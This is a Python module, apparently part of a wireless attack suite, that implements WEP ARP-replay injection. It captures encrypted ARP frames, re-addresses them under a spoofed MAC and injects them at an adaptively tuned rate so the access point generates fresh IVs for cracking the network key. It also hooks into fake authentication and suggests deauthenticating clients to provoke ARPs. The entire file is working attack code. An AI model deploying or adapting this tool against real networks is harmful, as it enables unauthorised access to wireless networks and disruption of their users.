"""WEP ARP replay (`aireplay-ng -3`) — the IV workhorse.

Re-injects a captured WEP-encrypted ARP request on a loop. The AP can't tell
it's a replay (WEP has no replay protection — that absence is *why* this
works), so it decrypts and rebroadcasts each one under a FRESH IV. Every
rebroadcast is a new unique IV for the cracker. This is the only attack in
the suite that actually generates IVs; fake-auth gates it and (later)
frag/chopchop only manufacture an ARP to feed it.

Only ToDS (client→AP) ARPs are usable seeds — the collector enforces that.

Candidate handling (deliberately PATIENT): the relayed IV from a good ARP can
arrive a beat after a single short burst, so judging a candidate on one cycle
falsely condemns replayable seeds. Instead each candidate gets a multi-second
trial; only sustained zero-yield blacklists it. Once one yields, we lock on
and keep replaying it. If a locked winner stalls (likely we got de-associated)
we ask fake-auth to re-auth and keep the same seed rather than discarding it.

Operating shape: short TX bursts separated by RX windows, with a hill-climb
that nudges burst size toward the best IV yield.
"""

from __future__ import annotations

import asyncio
import logging
import os
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional

from wifit3.engine.models import AccessPoint

logger = logging.getLogger(__name__)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


@dataclass
class ArpReplayStats:
    injected: int = 0
    cycles: int = 0
    last_gain: int = 0           # unique IVs gained in the last burst cycle
    effective_pps: float = 0.0   # injected / full cycle (incl. RX window)
    raw_pps: float = 0.0         # injected / burst-only (the hardware cap tell)
    burst_size: int = 0          # current adaptive burst size
    candidates_tried: int = 0
    candidates_failed: int = 0
    has_winner: bool = False
    started_at: float = field(default_factory=time.time)


class WepArpReplay:
    """ARP-replay loop with patient candidate testing + P&O rate control.

    Injection rate is tuned by **perturb-and-observe** (the solar-MPPT
    algorithm) to MAXIMIZE IVs/s — the real objective — rather than maximizing
    pps or capture%. Hardware showed a single interior optimum (~80-120 pps on
    the dd-wrt box): below it we under-drive the AP, above it we overflow its
    rebroadcast queue + starve our half-duplex RX, so IVs/s falls on BOTH sides.
    P&O finds + hovers at that peak on whatever AP it's pointed at: step the
    rate, wait LONGER than the AP's relay delay (~1-2s), measure IVs/s, keep the
    step's direction if IVs/s improved else reverse. (The old climber failed
    because it hill-climbed burst size on PER-CYCLE gain — a window shorter than
    the relay delay, so it climbed on misattributed noise to max burst.)
    """

    # P&O rate controller. Control var = injection pps; objective = IVs/s
    # measured over a DWELL that exceeds the AP relay delay (so a step's IVs have
    # landed before we judge it). Start near the observed optimum to converge
    # fast; bounds keep the search sane.
    _PO_DWELL_S = 8.0
    _PO_STEP_PPS = 32.0
    _PO_START_PPS = 96.0
    _PO_MIN_PPS = 24.0
    _PO_MAX_PPS = 500.0
    # Relative improvement deadband — only reverse on a real drop, so per-dwell
    # noise doesn't cause needless thrashing at the peak.
    _PO_IMPROVE_EPS = 0.03
    _BURST = 16          # frames per cycle (granularity; the pace sets the rate)
    # How long to keep testing one candidate before judging it (seconds). The
    # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
    _TRIAL_WINDOW = 2.5
    _MIN_TRIAL_GAIN = 1
    # A locked winner that yields nothing for this long is probably a stale
    # association → ask fake-auth to re-auth (keep the seed) before giving up.
    _STALL_REAUTH_AFTER = 2.0
    _STALL_DEMOTE_AFTER = 6.0
    # Forgive the blacklist periodically (earlier failures may have been
    # "not associated yet" rather than "bad ARP").
    _FAILED_RETRY_COOLDOWN = 20.0

    def __init__(
        self,
        iface,
        target: AccessPoint,
        collector,
        source_mac: Optional[bytes] = None,
        can_inject: Optional[Callable[[], bool]] = None,
        notify_activity: Optional[Callable[[], None]] = None,
        request_reauth: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
        rx_window: float = 0.15,
        heartbeat_s: float = 8.0,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = _str_to_mac(target.bssid)
        # The associated STA we source replays from (the fake-auth MAC). A
        # captured ARP's encrypted body is re-addressed under this MAC.
        self.source_mac = source_mac or (bytes([0x02]) + os.urandom(5))
        self.collector = collector
        self._can_inject = can_inject or (lambda: True)
        self._notify_activity = notify_activity or (lambda: None)
        self._request_reauth = request_reauth or (lambda: None)
        self._log = log_callback or (lambda _m: None)
        self.rx_window = rx_window
        self.heartbeat_s = heartbeat_s

        self.stats = ArpReplayStats()
        self.state = "idle"        # idle|waiting-auth|waiting-arp|testing|replaying|paused

        self._active = False
        self._paused = False
        self._task: Optional[asyncio.Task] = None

        self._burst_size = self._BURST
        # P&O rate-controller state.
        self._rate = self._PO_START_PPS       # current target injection pps
        self._rate_step = self._PO_STEP_PPS   # signed perturbation
        self._po_prev_ivs_s = -1.0            # last dwell's measured IVs/s
        self._po_window_start = 0.0           # dwell start time
        self._po_window_ivs0 = 0              # unique IVs at dwell start

        # Candidate under test/replay + its trial accounting.
        self._current: Optional[bytes] = None
        self._winner: Optional[bytes] = None
        self._trial_gain = 0
        self._trial_started = 0.0
        self._stall_started = 0.0
        self._reauth_requested = False
        self._failed: set[bytes] = set()
        self._failed_at = 0.0

        self._last_state = ""
        self._last_heartbeat = 0.0
        # Unique-IV count when THIS replay session started. capture% is measured
        # against IVs gained since (self.stats.injected also resets per session)
        # — the store's unique count is cumulative across campaigns, so dividing
        # the raw total by a fresh injected count gave nonsense like "17034%".
        self._unique_baseline = 0

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.stats = ArpReplayStats()
        self._unique_baseline = self.collector.unique_count(self.bssid)
        # Fresh P&O search each session.
        self._rate = self._PO_START_PPS
        self._rate_step = self._PO_STEP_PPS
        self._po_prev_ivs_s = -1.0
        self._po_window_start = 0.0
        self._task = asyncio.create_task(self._replay_loop())
        logger.info("[WEP-ARP] Replay started on %s", self.bssid)

    def stop(self) -> ArpReplayStats:
        if not self._active:
            return self.stats
        self._active = False
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info(
            "[WEP-ARP] Replay stopped: %d injected, %d unique IVs.",
            self.stats.injected, self.collector.unique_count(self.bssid),
        )
        return self.stats

    def pause(self) -> None:
        """Halt TX without tearing down — for the frag/chopchop sub-modes that
        need exclusive use of the radio."""
        self._paused = True
        self._log("[dim]· debug: ARP replay PAUSED (handed radio to frag)[/dim]")

    def resume(self) -> None:
        self._paused = False
        self._log("[dim]· debug: ARP replay RESUMED[/dim]")

    @property
    def is_active(self) -> bool:
        return self._active

    @property
    def target_pps(self) -> float:
        """The P&O-chosen injection rate (the smooth controlled variable). Use
        this for display, NOT stats.effective_pps — the latter is the per-cycle
        MEASURED rate and jitters with USB/scheduling latency."""
        return self._rate

    # ---- Candidate selection ------------------------------------------------

    def _next_candidate(self, candidates: List[bytes]) -> Optional[bytes]:
        """First not-blacklisted candidate (winner handling is in the loop).
        Periodically forgives the blacklist."""
        if self._failed and (time.time() - self._failed_at) > self._FAILED_RETRY_COOLDOWN:
            self._failed.clear()
        for cand in candidates:
            if cand not in self._failed:
                return cand
        return None

    def _begin_trial(self, cand: bytes) -> None:
        self._current = cand
        self._trial_gain = 0
        self._trial_started = time.time()
        self._stall_started = 0.0
        self._reauth_requested = False
        if cand is not self._winner:
            self.stats.candidates_tried += 1

    # ---- Replay loop --------------------------------------------------------

    async def _replay_loop(self) -> None:
        try:
            while self._active:
                if self._paused:
                    self._set_state("paused")
                    await asyncio.sleep(0.2)
                    continue
                if not self._can_inject():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.2)
                    continue

                # A confirmed winner is replayed forever — WEP frames never
                # expire, so don't drop it just because it aged out of the
                # constantly-churning capture ring (our own replays make the AP
                # rebroadcast, flooding the ring with fresh frames). Re-picking
                # an evicted winner each cycle is what spammed the log.
                if self._winner is not None:
                    self._current = self._winner
                else:
                    candidates = self.collector.arp_candidates(self.bssid)
                    cand = self._next_candidate(candidates)
                    if cand is None:
                        self._set_state("waiting-arp")
                        await asyncio.sleep(0.3)
                        self._maybe_heartbeat()
                        continue
                    if self._current is not cand:
                        self._begin_trial(cand)

                gain = await self._burst_and_measure(self._current)
                self._trial_gain += gain
                self._judge(gain)
                self._maybe_adjust_rate()
                self._maybe_heartbeat()
        except asyncio.CancelledError:
            pass

    def _build_replay_frame(self, captured: bytes) -> Optional[bytes]:
        """Re-address a captured WEP ARP into a ToDS frame sourced from our
        associated MAC, reusing its (cleartext-headed) encrypted body verbatim.

        The 802.11 header is NOT encrypted, so swapping it doesn't disturb the
        IV / ciphertext / ICV — the AP decrypts the body with the same key+IV,
        sees a valid broadcast ARP from an associated STA (us), and relays it
        with a fresh IV. Works for frames captured in EITHER direction.
        """
        if len(captured) < 28:
            return None
        fc0, fc1 = captured[0], captured[1]
        hdr = 24
        if (fc1 & 0x01) and (fc1 & 0x02):    # ToDS+FromDS → 4-addr (WDS)
            hdr += 6
        if ((fc0 & 0xF0) >> 4) & 0x08:       # QoS data subtype
            hdr += 2
        if fc1 & 0x80:                       # HT Control (Order bit)
            hdr += 4
        body = captured[hdr:]                # IV(3)+KeyID(1)+ciphertext+ICV
        if len(body) < 8:
            return None
        new_hdr = (
            b"\x08\x41"                       # Data, ToDS=1, Protected=1
            + b"\x00\x00"                     # Duration
            + self.bssid_bytes                # Addr1 = BSSID (RA)
            + self.source_mac                 # Addr2 = us (associated TA/SA)
            + b"\xff\xff\xff\xff\xff\xff"     # Addr3 = broadcast (DA)
            + b"\x00\x00"                     # Seq (hardware fills)
        )
        return new_hdr + body

    async def _burst_and_measure(self, cand: bytes) -> int:
        frame = self._build_replay_frame(cand)
        if frame is None:
            # Malformed capture — blacklist and move on.
            self._failed.add(cand)
            self._current = None
            return 0
        ivs_before = self.collector.unique_count(self.bssid)
        t0 = time.time()
        sent = 0
        for _ in range(self._burst_size):
            if not self._active:
                break
            try:
                await self.iface.send_raw(frame, use_no_ack=True)
                self.stats.injected += 1
                sent += 1
            except Exception:
                logger.exception("[WEP-ARP] send_raw failed")
                break
        send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
        if sent:
            self._notify_activity()   # our traffic keeps the assoc alive
        # Pace this cycle to the P&O-chosen rate (frames/_rate), with the
        # leftover time serving as the RX window for rebroadcasts to land;
        # never shorter than rx_window.
        desired_cycle = self._burst_size / max(1.0, self._rate)
        await asyncio.sleep(max(self.rx_window, desired_cycle - send_dt))
        cycle_dt = max(1e-3, time.time() - t0)
        self.stats.cycles += 1
        self.stats.raw_pps = sent / send_dt
        self.stats.effective_pps = sent / cycle_dt
        self.stats.burst_size = self._burst_size
        gain = self.collector.unique_count(self.bssid) - ivs_before
        self.stats.last_gain = gain
        return gain

    def _judge(self, gain: int) -> None:
        """Decide what to do with the current candidate based on its trial."""
        is_winner = self._current is self._winner

        if is_winner:
            self._set_state("replaying")
            if gain > 0:
                self._stall_started = 0.0
                self._reauth_requested = False
                return
            # Winner went quiet — likely we got de-associated. Give it a grace
            # period, ask fake-auth to re-auth, and only demote if it stays dead.
            now = time.time()
            if self._stall_started == 0.0:
                self._stall_started = now
            stalled = now - self._stall_started
            if stalled > self._STALL_REAUTH_AFTER and not self._reauth_requested:
                self._reauth_requested = True
                self._request_reauth()
                self._log("[yellow]ARP replay stalled — re-authenticating[/yellow]")
            if stalled > self._STALL_DEMOTE_AFTER:
                self._winner = None
                self._current = None
                self.stats.has_winner = False
                self._log(
                    f"[dim]· debug: ARP replay DEMOTED seed "
                    f"({self._STALL_DEMOTE_AFTER:.0f}s no IVs despite re-auth) "
                    f"→ re-testing candidates[/dim]"
                )
            return

        # Testing a candidate: judge only after a full trial window.
        self._set_state("testing")
        if self._trial_gain >= self._MIN_TRIAL_GAIN:
            self._winner = self._current
            self.stats.has_winner = True
            self._failed.discard(self._current)
            self._log(
                f"[green]✓ ARP replay working[/green] [dim](seed yields IVs — "
                f"{self._trial_gain} so far)[/dim]"
            )
        elif (time.time() - self._trial_started) >= self._TRIAL_WINDOW:
            self._failed.add(self._current)
            self._failed_at = time.time()
            self.stats.candidates_failed = len(self._failed)
            self._current = None

    def _reset_po_window(self) -> None:
        """(Re)start the P&O measurement dwell at the current IV count."""
        self._po_window_start = time.time()
        self._po_window_ivs0 = self.collector.unique_count(self.bssid)

    def _maybe_adjust_rate(self) -> None:
        """Perturb-and-observe step on the injection rate, run once per dwell —
        ONLY while actively replaying a winner (otherwise IVs/s isn't a clean
        function of our rate). Measures IVs/s over the dwell (a window longer
        than the AP's relay delay), then keeps the perturbation's direction if
        IVs/s improved, else reverses — so the rate converges to and dithers
        around the IVs/s peak.
        """
        if self.state != "replaying":
            # No steady injection to measure; hold rate + keep the window fresh.
            self._reset_po_window()
            return
        if self._po_window_start == 0.0:
            self._reset_po_window()
            return
        now = time.time()
        dwell = now - self._po_window_start
        if dwell < self._PO_DWELL_S:
            return
        ivs_now = self.collector.unique_count(self.bssid)
        measured = (ivs_now - self._po_window_ivs0) / dwell   # IVs/s this dwell

        if self._po_prev_ivs_s < 0:
            # First measurement — no baseline yet; just record + take a step.
            self._po_prev_ivs_s = measured
        else:
            # Reverse only on a real drop (deadband absorbs per-dwell noise).
            if measured < self._po_prev_ivs_s * (1.0 - self._PO_IMPROVE_EPS):
                self._rate_step = -self._rate_step
            self._po_prev_ivs_s = measured

        self._rate = min(
            self._PO_MAX_PPS, max(self._PO_MIN_PPS, self._rate + self._rate_step)
        )
        self._reset_po_window()

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        """Set the current state; log only on a real transition (no spam)."""
        self.state = state
        if state == self._last_state:
            return
        self._last_state = state
        if state == "waiting-arp":
            seen = self.collector.arp_seen_count(self.bssid)
            detail = (
                "deauth a client to provoke one" if seen == 0
                else f"{seen} seen, deauth to provoke one"
            )
            self._log(
                "[green]ARP Replay:[/green] [white]waiting for replayable ARP"
                f"[/white] [dim]({detail})[/dim]"
            )
        elif state == "testing":
            self._log("[green]ARP Replay:[/green] [white]testing a candidate…[/white]")
        elif state == "waiting-auth":
            self._log("[green]ARP Replay:[/green] [dim]waiting for association…[/dim]")

    def _maybe_heartbeat(self) -> None:
        """Periodic progress line — only while actively replaying."""
        if self.state != "replaying":
            return
        now = time.time()
        if now - self._last_heartbeat < self.heartbeat_s:
            return
        self._last_heartbeat = now
        unique = self.collector.unique_count(self.bssid)
        # capture% = IVs gained THIS session / injected THIS session (both reset
        # per replay start), so it reflects replay efficiency, not the store's
        # cumulative IV total.
        gained = max(0, unique - self._unique_baseline)
        capture = (100.0 * gained / self.stats.injected) if self.stats.injected else 0.0
        # "X pps → Y IVs/s" = the P&O controller's input→output. pps is the
        # TARGET rate (smooth — what P&O steers), NOT the per-cycle measured
        # effective_pps (which jitters with USB/scheduling latency). IVs/s is
        # the objective P&O maximizes.
        ivs_per_s = self.collector.rate(self.bssid)
        self._log(
            f"[green]ARP Replay:[/green] [dim]{self.target_pps:.0f} pps → "
            f"{ivs_per_s:.0f} IVs/s · {self.stats.injected:,} injected · "
            f"{unique:,} IVs ({capture:.0f}% capture)[/dim]"
        )
